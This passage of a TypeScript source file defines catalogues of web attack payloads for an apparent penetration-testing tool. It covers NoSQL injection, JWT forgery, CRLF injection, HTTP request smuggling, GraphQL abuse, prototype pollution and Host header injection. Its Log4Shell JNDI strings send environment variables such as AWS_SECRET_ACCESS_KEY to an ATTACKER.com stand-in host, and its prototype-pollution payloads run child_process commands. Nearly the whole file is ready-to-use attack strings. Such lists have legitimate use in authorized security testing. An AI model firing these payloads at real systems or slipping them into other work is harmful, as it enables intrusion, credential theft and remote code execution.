    '{"username": "admin", "password": {"$regex": "^abc"}}',
    // Aggregation injection
    '{"username": {"$lookup": {"from": "users", "localField": "user", "foreignField": "_id", "as": "data"}}}',
    // Array operators
    '{"username": {"$all": ["admin"]}, "password": {"$gt": ""}}',
    '{"username": {"$elemMatch": {"$gt": "a"}}, "password": {"$gt": ""}}',
  ],
}

export const jwtAttacks: PayloadCategory = {
  title: "JWT — Ataques de Token",
  description: "None algorithm, alg confusion RS→HS, kid injection, jku/x5u SSRF, y manipulación de claims",
  tag: "JWT",
  tagColor: "bg-violet-500/10 text-violet-400 border-violet-500/20",
  payloads: [
    // Algoritmo none
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
    // Header con alg: none (decodificado)
    '{"alg":"none","typ":"JWT"}',
    '{"alg":"None","typ":"JWT"}',
    '{"alg":"NONE","typ":"JWT"}',
    '{"alg":"nOnE","typ":"JWT"}',
    // Claims comunes a manipular
    '{"sub":"admin","role":"admin","iat":1516239022,"exp":9999999999}',
    '{"sub":"1","admin":true,"iat":1516239022,"exp":9999999999}',
    '{"userId":"1","isAdmin":true,"exp":9999999999}',
    // kid injection (SQLi en kid header)
    '{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}',
    '{"alg":"HS256","typ":"JWT","kid":"x\' UNION SELECT \'secretkey\'--"}',
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uL2Rldi9udWxsIn0",
    // jku SSRF — servidor externo provee JWKS
    '{"alg":"RS256","typ":"JWT","jku":"https://ATTACKER.com/jwks.json"}',
    '{"alg":"RS256","typ":"JWT","x5u":"https://ATTACKER.com/cert.pem"}',
    // Confusión RS256 → HS256 (firmar con clave pública como HMAC)
    "Técnica: decodificar JWT RS256, cambiar alg a HS256, firmar con la clave pública del servidor como secreto HMAC",
    // Secrets débiles comunes (para hashcat / jwt-cracker)
    "secret",
    "password",
    "123456",
    "qwerty",
    "jwt_secret",
    "your-256-bit-secret",
    "your-secret-key",
    "secretkey",
    "SuperSecret",
    "jwt-secret-key",
    "HS256Key",
    // Claim confusion
    '{"sub":"admin","aud":"https://target.com","exp":9999999999,"iss":"https://trusted-issuer.com"}',
    // Nested JWT / token embedding
    '{"token":"eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0."}',
  ],
}

export const crlfInjection: PayloadCategory = {
  title: "CRLF Injection / Header Injection",
  description: "Inyección de cabeceras HTTP, cookie splitting, log poisoning y respuestas HTTP divididas",
  tag: "CRLF",
  tagColor: "bg-lime-500/10 text-lime-400 border-lime-500/20",
  payloads: [
    "%0d%0aSet-Cookie: crlf=injection",
    "%0d%0aLocation: https://ATTACKER.com",
    "%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0aContent-Length: 25%0d%0a%0d%0a<script>alert(1)</script>",
    "%0d%0a%0d%0a<script>alert(1)</script>",
    "%0aSet-Cookie: crlf=injection",
    "%0aLocation: https://ATTACKER.com",
    "\\r\\nSet-Cookie: crlf=injection",
    "\\r\\nLocation: https://ATTACKER.com",
    "%E5%98%8D%E5%98%8ASet-Cookie: crlf=injection",
    "%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8ASet-Cookie: crlf=injection",
    "%u000d%u000aSet-Cookie: crlf=injection",
    "%c0%8dSet-Cookie: crlf=injection",
    // Log poisoning via CRLF
    "%0d%0aX-Forwarded-For: ../../../../etc/passwd",
    "%0d%0aUser-Agent: <script>alert(1)</script>",
    // HTTP response splitting
    "value%0d%0aContent-Type: text/html%0d%0a%0d%0a<h1>Injected</h1>",
    "value%0d%0aX-Custom-Header: injected%0d%0aAnother: header",
    // Cookie injection
    "%0d%0aSet-Cookie: admin=true; Path=/; HttpOnly",
    "%0d%0aSet-Cookie: sessionid=deadbeef; Domain=.target.com",
  ],
}

export const httpSmuggling: PayloadCategory = {
  title: "HTTP Request Smuggling",
  description: "Variantes CL.TE, TE.CL y TE.TE para dessincronizar front-end y back-end. Reemplazar \\r\\n literalmente.",
  tag: "HTTP Smuggling",
  tagColor: "bg-rose-500/10 text-rose-400 border-rose-500/20",
  payloads: [
    // CL.TE — frontend usa Content-Length, backend usa Transfer-Encoding
    `POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED`,
    // TE.CL — frontend usa Transfer-Encoding, backend usa Content-Length
    `POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n`,
    // TE.TE — dos cabeceras Transfer-Encoding, una ofuscada
    `POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n0\r\n\r\nSMUGGLED`,
    // TE ofuscado (bypassea normalización)
    "Transfer-Encoding: xchunked",
    "Transfer-Encoding : chunked",
    "Transfer-Encoding: chunked\\r\\nTransfer-Encoding: x",
    "Transfer-Encoding:\\x0bchunked",
    "Transfer-Encoding:\\x0cchunked",
    "Transfer-Encoding:\\x00chunked",
    "Transfer-Encoding: chunked\\r\\n Transfer-Encoding: chunked",
    // Detección de vuln — prefijo de petición capturada
    `POST / HTTP/1.1\r\nHost: target.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\n0\r\n\r\n`,
    // Capturar request de otro usuario
    `POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 130\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: target.com\r\nX-Ignore: X`,
  ],
}

export const log4shell: PayloadCategory = {
  title: "Log4Shell / JNDI Injection",
  description: "CVE-2021-44228 y variantes. Sustituir ATTACKER.com por tu servidor LDAP/DNS para confirmar OOB",
  tag: "Log4Shell",
  tagColor: "bg-amber-500/10 text-amber-400 border-amber-500/20",
  payloads: [
    // Básico
    "${jndi:ldap://ATTACKER.com/a}",
    "${jndi:ldaps://ATTACKER.com/a}",
    "${jndi:rmi://ATTACKER.com/a}",
    "${jndi:dns://ATTACKER.com/a}",
    "${jndi:iiop://ATTACKER.com/a}",
    "${jndi:corba://ATTACKER.com/a}",
    "${jndi:nds://ATTACKER.com/a}",
    "${jndi:http://ATTACKER.com/a}",
    // Ofuscados — evasión de WAF
    "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://ATTACKER.com/a}",
    "${${::-j}ndi:rmi://ATTACKER.com/a}",
    "${jndi:${lower:l}${lower:d}a${lower:p}://ATTACKER.com}",
    "${${upper:j}ndi:${upper:l}dap://ATTACKER.com/a}",
    "${${lower:j}${lower:n}${lower:d}i:${lower:r}m${lower:i}://ATTACKER.com/a}",
    "${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://ATTACKER.com/a}",
    "${j${::-n}di:ldap://ATTACKER.com/a}",
    "${j${lower:n}di:ldap://ATTACKER.com/a}",
    "${j${upper:n}di:ldap://ATTACKER.com/a}",
    "${jndi:ldap://ATTACKER.com/${env:USER}}",
    "${jndi:ldap://ATTACKER.com/${env:HOSTNAME}}",
    "${jndi:ldap://ATTACKER.com/${env:AWS_SECRET_ACCESS_KEY}}",
    "${jndi:ldap://ATTACKER.com/${java:version}}",
    "${jndi:ldap://ATTACKER.com/${sys:java.version}}",
    // En cabeceras comunes afectadas
    "X-Api-Version: ${jndi:ldap://ATTACKER.com/a}",
    "User-Agent: ${jndi:ldap://ATTACKER.com/a}",
    "X-Forwarded-For: ${jndi:ldap://ATTACKER.com/a}",
    "Referer: ${jndi:ldap://ATTACKER.com/a}",
    "Authorization: Bearer ${jndi:ldap://ATTACKER.com/a}",
    "X-Custom-Header: ${jndi:ldap://ATTACKER.com/a}",
    // Log4Shell 2 (CVE-2021-45046) — Context Lookup
    "${jndi:ldap://ATTACKER.com/a}",
    "${ctx:loginId}",
    "${map:type}",
    "${filename}",
    "${web:rootDir}",
  ],
}

export const graphqlAttacks: PayloadCategory = {
  title: "GraphQL — Introspección y Ataques",
  description: "Queries de introspección, batching DoS, inyección en argumentos, bypass de limit y field suggestion",
  tag: "GraphQL",
  tagColor: "bg-sky-500/10 text-sky-400 border-sky-500/20",
  payloads: [
    // Introspección completa
    `{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated:true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated:true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }`,
    // Introspección simplificada — enumerar tipos
    "{ __schema { types { name kind } } }",
    // Enumerar queries disponibles
    "{ __schema { queryType { fields { name description } } } }",
    // Enumerar mutations
    "{ __schema { mutationType { fields { name } } } }",
    // Field suggestion bypass (typo intencional para sugerencias)
    "{ users { passwrd } }",
    // Query depth DoS
    "{ a { a { a { a { a { a { a { a { a { a { a { a { a { a { a { a { a { a { a { a { id } } } } } } } } } } } } } } } } } } } } }",
    // Batch query DoS
    '[{"query":"{user(id:1){id}}"},{"query":"{user(id:2){id}}"},{"query":"{user(id:3){id}}"}]',
    // Inyección en argumento string
    '{ user(id: "1 OR 1=1") { id name email } }',
    '{ user(email: "admin@test.com\\\" OR \\\"1\\\"=\\\"1") { id } }',
    // Auth bypass via null
    '{ admin { users { id email password } } }',
    // Aliases para bypass de rate-limit
    "{ a: user(id:1){id} b: user(id:2){id} c: user(id:3){id} d: user(id:4){id} }",
    // CSRF via GET
    "/graphql?query={user(id:1){email}}",
    "/graphiql?query={__schema{types{name}}}",
    "/graphql/console",
    "/v1/graphql",
    "/api/graphql",
    // Fragment circular (DoS)
    "fragment A on User { ...B } fragment B on User { ...A } { user(id:1) { ...A } }",
    // Variables con inyección
    '{"query":"mutation($u:String!,$p:String!){login(username:$u,password:$p){token}}","variables":{"u":"admin","p":"password\\" OR 1=1--"}}',
  ],
}

export const prototypePollution: PayloadCategory = {
  title: "Prototype Pollution",
  description: "Inyección en __proto__, constructor.prototype y Object.prototype para Node.js y apps JavaScript",
  tag: "Prototype Pollution",
  tagColor: "bg-fuchsia-500/10 text-fuchsia-400 border-fuchsia-500/20",
  payloads: [
    // Básico en JSON
    '{"__proto__": {"admin": true}}',
    '{"__proto__": {"isAdmin": true}}',
    '{"__proto__": {"role": "admin"}}',
    '{"__proto__": {"polluted": "yes"}}',
    '{"constructor": {"prototype": {"admin": true}}}',
    '{"constructor": {"prototype": {"isAdmin": true}}}',
    // En URL params
    "__proto__[admin]=true",
    "__proto__[isAdmin]=true",
    "__proto__[role]=admin",
    "constructor[prototype][admin]=true",
    "constructor.prototype.admin=true",
    // Bypass comunes de sanitizers
    '{"__proto__":{"admin":true}}',
    '{"__pRoTo__":{"admin":true}}',
    '{"__PRO__TO__":{"admin":true}}',
    // RCE via prototype pollution en Node.js (dependencias vulnerables)
    '{"__proto__": {"outputFunctionName": "_x; process.mainModule.require(\'child_process\').execSync(\'id\');//"}}',
    '{"__proto__": {"shell": "node", "NODE_OPTIONS": "--inspect=ATTACKER.com:4444"}}',
    '{"__proto__": {"main": "/proc/self/exe", "NODE_OPTIONS": "--require /proc/self/fd/0"}}',
    // lodash merge / deepmerge path
    '{"__proto__":{"toString":{}}}',
    '{"a":{"__proto__":{"admin":true}}}',
    // Contaminación de env
    '{"__proto__":{"env":{"NODE_OPTIONS":"--require /dev/stdin"}}}',
    // AST injection (Handlebars, Pug, etc.)
    '{"__proto__":{"pendingReq":true}}',
    '{"__proto__":{"type":"Program","body":[{"type":"MustacheStatement","path":{"type":"PathExpression","original":"process.mainModule.require(\'child_process\').execSync(\'id\').toString()","parts":[]}}]}}',
  ],
}

export const hostHeaderInjection: PayloadCategory = {
  title: "Host Header Injection",
  description: "Password reset poisoning, cache poisoning y bypass de acceso via cabeceras Host, X-Forwarded-Host, X-Host",
  tag: "Host Header",
  tagColor: "bg-orange-500/10 text-orange-400 border-orange-500/20",
  payloads: [
    // Password reset poisoning
    "Host: ATTACKER.com",
    "Host: target.com:@ATTACKER.com",
    "Host: target.com\\nHost: ATTACKER.com",
    // X-Forwarded headers
    "X-Forwarded-Host: ATTACKER.com",
    "X-Forwarded-Host: target.com, ATTACKER.com",
    "X-Forwarded-For: 127.0.0.1",
    "X-Forwarded-For: 127.0.0.1, 10.0.0.1",
    "X-Original-Host: ATTACKER.com",
    "X-Host: ATTACKER.com",
    "X-Rewrite-URL: /admin",
    "X-Original-URL: /admin",
    "X-Override-URL: /admin",
    "X-Custom-IP-Authorization: 127.0.0.1",
    "X-Forwarded-Server: ATTACKER.com",
    "X-HTTP-Host-Override: ATTACKER.com",
    // Absoluta URL override
    "GET http://ATTACKER.com/ HTTP/1.1",
    // Interno bypass
    "Host: localhost",
    "Host: 127.0.0.1",
    "Host: 0.0.0.0",
    "Host: 192.168.0.1",
    "Host: internal.target.com",
    // Cache poisoning via port
    "Host: target.com:1337",
    // DoubleSub bypass
    "Host: ATTACKER.com.target.com",
    "Host: target.com.ATTACKER.com",
    // Web cache deception
    "X-Forwarded-Host: evil.com/static/../private",
    // Routing-based intrusion
    "Host: target.com\\r\\nX-Injected: header",
  ],
}

export const allPayloadCategories: PayloadCategory[] = [
  sqliClassic,
  sqliUnionBased,
  sqliErrorBased,
  sqliBlindBoolean,
  sqliTimeBased,
  sqliObfuscated,
  sqliOOB,
  nosqlInjection,
  xssClassic,
  xssFilterBypass,
  xssObfuscated,
  xssDOM,
  xssPolyglot,
  cmdInjection,
  cmdInjectionObfuscated,
  sstiPayloads,
  pathTraversal,
  xxePayloads,
  ssrfPayloads,
  openRedirect,
  crlfInjection,
  httpSmuggling,
  log4shell,
  graphqlAttacks,
  prototypePollution,
  hostHeaderInjection,
  jwtAttacks,
]
